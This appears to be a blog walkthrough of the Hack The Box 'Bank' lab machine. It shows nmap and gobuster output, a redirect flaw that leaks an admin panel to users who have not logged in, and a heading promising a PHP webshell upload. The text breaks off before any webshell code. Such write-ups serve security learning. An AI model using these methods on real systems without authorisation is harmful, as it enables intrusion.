<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>nullarmor | Bank - Hack The Box</title>
  <meta name="description" content="Resolution of the Bank machine">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="Bank - Hack The Box">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://nullarmor.github.io/posts/bank">
  <meta property="og:description" content="Resolution of the Bank machine">
  <meta property="og:site_name" content="nullarmor">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="https://nullarmor.github.io/posts/bank">
  <meta name="twitter:title" content="Bank - Hack The Box">
  <meta name="twitter:description" content="Resolution of the Bank machine">
  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />

  
    
      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/bank/bank-00-839eab88e2f1c6d703b092d3c05dc163c5564ccef799c286e7f70092ab48e496.png">
      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/bank/bank-00-839eab88e2f1c6d703b092d3c05dc163c5564ccef799c286e7f70092ab48e496.png">
    
  

  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />

  

  

    
      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
    

  

</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
</svg>

        </a>
      </li>
    
    
      <li>
        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
</svg>

        </a>
      </li>
    
    
    
    
      <li>
        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
      <li>
        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
    
    
    
      <li>
        <a href="mailto:nullarmor@protonmail.com" title="Email">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
</svg>

        </a>
      </li>
    
    
    
      <li>
        <a onclick="toggle()" title="Toggle Theme">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
</svg>

        </a>
      </li>
    
  </ul>
</nav>


  <ul class="header-tags scrollappear">
    
    
      
        <li><a href="/tag/ctf">Ctf</a></li>
    
      
        <li><a href="/tag/cybrics">Cybrics</a></li>
    
      
        <li><a href="/tag/hackthebox">Hackthebox</a></li>
    
      
        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
    
      
        <li><a href="/tag/pwn">Pwn</a></li>
    
      
        <li><a href="/tag/rev">Rev</a></li>
    
      
        <li><a href="/tag/rgbctf">Rgbctf</a></li>
    
      
        <li><a href="/tag/web">Web</a></li>
    
  </ul>


        <article class="article scrollappear">
          <header class="article-header">
            <h1>Bank - Hack The Box</h1>
            <p>Resolution of the Bank machine</p>
            <div class="article-list-footer">
  <span class="article-list-date">
    July 2, 2020
  </span>
  <span class="article-list-divider">-</span>
  <span class="article-list-minutes">
    
    
      10 minute read
    
  </span>
  <span class="article-list-divider">-</span>
  <div class="article-list-tags">
    
      
      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
    
  </div>
</div>
          </header>

          <div class="article-content">
            <p><a href="/assets/hackthebox/bank/bank-00-839eab88e2f1c6d703b092d3c05dc163c5564ccef799c286e7f70092ab48e496.png">
  <img src="/assets/hackthebox/bank/bank-00-839eab88e2f1c6d703b092d3c05dc163c5564ccef799c286e7f70092ab48e496.png" alt="Bank banner" class="zooming" data-rjs="/assets/hackthebox/bank/bank-00-839eab88e2f1c6d703b092d3c05dc163c5564ccef799c286e7f70092ab48e496.png" data-zooming-width="534" data-zooming-height="340" />
</a></p>

<p>Bank is an easy level machine based on Linux, the initial approach is based on a vulnerability in the <code class="highlighter-rouge">authentication mechanism</code> of <code class="highlighter-rouge">HTB Bank</code> application.
The privilege escalation process is based on the enumeration of <code class="highlighter-rouge">SUID binaries</code>.</p>

<h1 id="recon">Recon</h1>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-05-08 14:51 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.29
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 <span class="o">(</span>RSA<span class="o">)</span>
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>20.88 seconds</code></pre></figure>

<p>Port 80 has the default apache page:</p>

<p><a href="/assets/hackthebox/bank/bank-01-6f9c5494787d635a6277e5f768c3a5f03226eeab9d6c613a485ef1598f972126.png">
  <img src="/assets/hackthebox/bank/bank-01-6f9c5494787d635a6277e5f768c3a5f03226eeab9d6c613a485ef1598f972126.png" alt="Bank Recon" class="zooming" data-rjs="/assets/hackthebox/bank/bank-01-6f9c5494787d635a6277e5f768c3a5f03226eeab9d6c613a485ef1598f972126.png" data-zooming-width="1308" data-zooming-height="556" />
</a></p>

<p>In order to properly explore the machine, we need to add his DNS entry at <code class="highlighter-rouge">/etc/hosts</code>:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">"10.10.10.29 bank.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts</code></pre></figure>

<p>After that, the index page has changed, now there’s a login form to a web application called <code class="highlighter-rouge">HTB Bank</code>:</p>

<p><a href="/assets/hackthebox/bank/bank-02-b24850cae51dbb4d770398a51b96417442305448e71f7928f72ef6082a3a5fa9.png">
  <img src="/assets/hackthebox/bank/bank-02-b24850cae51dbb4d770398a51b96417442305448e71f7928f72ef6082a3a5fa9.png" alt="Bank Recon" class="zooming" data-rjs="/assets/hackthebox/bank/bank-02-b24850cae51dbb4d770398a51b96417442305448e71f7928f72ef6082a3a5fa9.png" data-zooming-width="1316" data-zooming-height="480" />
</a></p>

<h1 id="exploiting---bypassing-the-authentication-and-uploading-a-php-webshell-as-an-unauthenticated-user">Exploiting - Bypassing the authentication and uploading a PHP webshell as an unauthenticated user</h1>

<p>After some time playing with requests against the web application, we noticed a strange behavior: <code class="highlighter-rouge">the web application doesn't validate the user's authentication before the redirection</code>.</p>

<p>Sending a <code class="highlighter-rouge">GET request</code> to the index.php page, we noticed a redirection revealing an administrative panel (only visible to authenticated users):</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-10"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-3 col-md-6"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel panel-primary"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-heading"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-3"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-usd fa-5x"</span><span class="nt">&gt;&lt;/i&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-9 text-right"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"font-size: 30px;"</span><span class="nt">&gt;</span> $<span class="nt">&lt;/div&gt;</span>
                            <span class="nt">&lt;div&gt;</span>Balance<span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-3 col-md-6"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel panel-yellow"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-heading"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-3"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-shopping-cart fa-5x"</span><span class="nt">&gt;&lt;/i&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-9 text-right"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"font-size: 30px;"</span><span class="nt">&gt;</span>8<span class="nt">&lt;/div&gt;</span>
                            <span class="nt">&lt;div&gt;</span>Total Transactions<span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-3 col-md-6"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel panel-green"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-heading"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-3"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-credit-card fa-5x"</span><span class="nt">&gt;&lt;/i&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-9 text-right"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"font-size: 30px;"</span><span class="nt">&gt;</span>0<span class="nt">&lt;/div&gt;</span>
                            <span class="nt">&lt;div&gt;</span>Total CreditCards<span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-3 col-md-6"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel panel-red"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-heading"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-3"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-support fa-5x"</span><span class="nt">&gt;&lt;/i&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-xs-9 text-right"</span><span class="nt">&gt;</span>
                            <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"font-size: 30px;"</span><span class="nt">&gt;</span>6<span class="nt">&lt;/div&gt;</span>
                            <span class="nt">&lt;div&gt;</span>Support Tickets<span class="nt">&lt;/div&gt;</span>
                        <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="c">&lt;!-- /.row --&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel panel-default"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-heading"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;h3</span> <span class="na">style=</span><span class="s">"font-size: 20px;"</span><span class="nt">&gt;&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-credit-card fa-fw"</span><span class="nt">&gt;&lt;/i&gt;</span> CreditCard Information<span class="nt">&lt;/h3&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-body"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"table-responsive"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">"table table-bordered table-hover table-striped"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;thead&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                            	<span class="nt">&lt;th&gt;</span>Card Type<span class="nt">&lt;/th&gt;</span>
                                <span class="nt">&lt;th&gt;</span>Card Number<span class="nt">&lt;/th&gt;</span>
                                <span class="nt">&lt;th&gt;</span>Card Exp Date<span class="nt">&lt;/th&gt;</span>
                                <span class="nt">&lt;th&gt;</span>CVV<span class="nt">&lt;/th&gt;</span>
                                <span class="nt">&lt;th&gt;</span>Balance<span class="nt">&lt;/th&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                        <span class="nt">&lt;/thead&gt;</span>
                        <span class="nt">&lt;tbody&gt;</span>
                                                    <span class="nt">&lt;/tbody&gt;</span>
                    <span class="nt">&lt;/table&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel panel-default"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-heading"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;h3</span> <span class="na">style=</span><span class="s">"font-size: 20px;"</span><span class="nt">&gt;&lt;i</span> <span class="na">class=</span><span class="s">"fa fa-money fa-fw"</span><span class="nt">&gt;&lt;/i&gt;</span> Transaction History<span class="nt">&lt;/h3&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-body"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"table-responsive"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">"table table-bordered table-hover table-striped"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;thead&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;th&gt;</span>Transaction ID<span class="nt">&lt;/th&gt;</span>
                                <span class="nt">&lt;th&gt;</span>Transaction Date<span class="nt">&lt;/th&gt;</span>
                                <span class="nt">&lt;th&gt;</span>Transaction Time<span class="nt">&lt;/th&gt;</span>
                                <span class="nt">&lt;th&gt;</span>Amount (USD)<span class="nt">&lt;/th&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                        <span class="nt">&lt;/thead&gt;</span>
                        <span class="nt">&lt;tbody&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3326<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>10/21/2016<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3:29 PM<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>$321.33<span class="nt">&lt;/td&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3325<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>10/21/2016<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3:20 PM<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>$234.34<span class="nt">&lt;/td&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3324<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>10/21/2016<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3:03 PM<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>$724.17<span class="nt">&lt;/td&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3323<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>10/21/2016<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3:00 PM<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>$23.71<span class="nt">&lt;/td&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3322<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>10/21/2016<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>2:49 PM<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>$8345.23<span class="nt">&lt;/td&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3321<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>10/21/2016<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>2:23 PM<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>$245.12<span class="nt">&lt;/td&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3320<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>10/21/2016<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>2:15 PM<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>$5663.54<span class="nt">&lt;/td&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                            <span class="nt">&lt;tr&gt;</span>
                                <span class="nt">&lt;td&gt;</span>3319<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>10/21/2016<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>2:13 PM<span class="nt">&lt;/td&gt;</span>
                                <span class="nt">&lt;td&gt;</span>$943.45<span class="nt">&lt;/td&gt;</span>
                            <span class="nt">&lt;/tr&gt;</span>
                        <span class="nt">&lt;/tbody&gt;</span>
                    <span class="nt">&lt;/table&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="c">&lt;!-- /.row --&gt;</span>
<span class="nt">&lt;/div&gt;</span>

<span class="nt">&lt;/div&gt;</span>
<span class="c">&lt;!-- /.container-fluid --&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="c">&lt;!-- /#page-wrapper --&gt;</span>

    <span class="nt">&lt;/div&gt;</span>
    <span class="c">&lt;!-- /#wrapper --&gt;</span>

    <span class="c">&lt;!-- jQuery --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/jquery.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

    <span class="c">&lt;!-- Bootstrap Core JavaScript --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

    <span class="c">&lt;!-- Morris Charts JavaScript --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/plugins/morris/raphael.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/plugins/morris/morris.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/plugins/morris/morris-data.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

    <span class="c">&lt;!-- SweetAlert --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"./assets/js/sweetalert.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>

<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<p>This kind of vulnerability would be useful if we find any other vulnerability inside this panel.
After that we need to web enumerate the server to find more directories and files to be checked:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://bank.htb <span class="nt">-t</span> 100 <span class="nt">-r</span> <span class="nt">-x</span> php
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://bank.htb
<span class="o">[</span>+] Threads:        100
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php
<span class="o">[</span>+] Follow Redir:   <span class="nb">true</span>
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/05/09 12:10:43 Starting gobuster
<span class="o">===============================================================</span>
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
/assets <span class="o">(</span>Status: 200<span class="o">)</span>
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
/inc <span class="o">(</span>Status: 200<span class="o">)</span>
/login.php <span class="o">(</span>Status: 200<span class="o">)</span>
/logout.php <span class="o">(</span>Status: 200<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
/support.php <span class="o">(</span>Status: 200<span class="o">)</span>
/uploads <span class="o">(</span>Status: 403<span class="o">)</span>
<span class="o">===============================================================</span>
2020/05/09 12:11:55 Finished
<span class="o">===============================================================</span></code></pre></figure>

<p>Sending a GET request to <code class="highlighter-rouge">support.php</code> gives us the following output:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-5"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel panel-primary"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-heading"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;h3</span> <span class="na">style=</span><span class="s">"font-size: 20px;"</span><span class="nt">&gt;</span>My Tickets<span class="nt">&lt;/h3&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-body"</span><span class="nt">&gt;</span>
		    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"content-box-large"</span><span class="nt">&gt;</span>
		        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-body"</span><span class="nt">&gt;</span>
		            <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">"table table-bordered"</span><span class="nt">&gt;</span>
		                <span class="nt">&lt;thead&gt;</span>
		                    <span class="nt">&lt;tr&gt;</span>
		                        <span class="nt">&lt;th&gt;</span>#<span class="nt">&lt;/th&gt;</span>
		                        <span class="nt">&lt;th&gt;</span>Title<span class="nt">&lt;/th&gt;</span>
		                        <span class="nt">&lt;th&gt;</span>Message<span class="nt">&lt;/th&gt;</span>
		                        <span class="nt">&lt;th&gt;</span>Attachment<span class="nt">&lt;/th&gt;</span>
                                        <span class="nt">&lt;th&gt;</span>Actions<span class="nt">&lt;/th&gt;</span>
		                    <span class="nt">&lt;/tr&gt;</span>
		                <span class="nt">&lt;/thead&gt;</span>
		                <span class="nt">&lt;tbody&gt;</span>
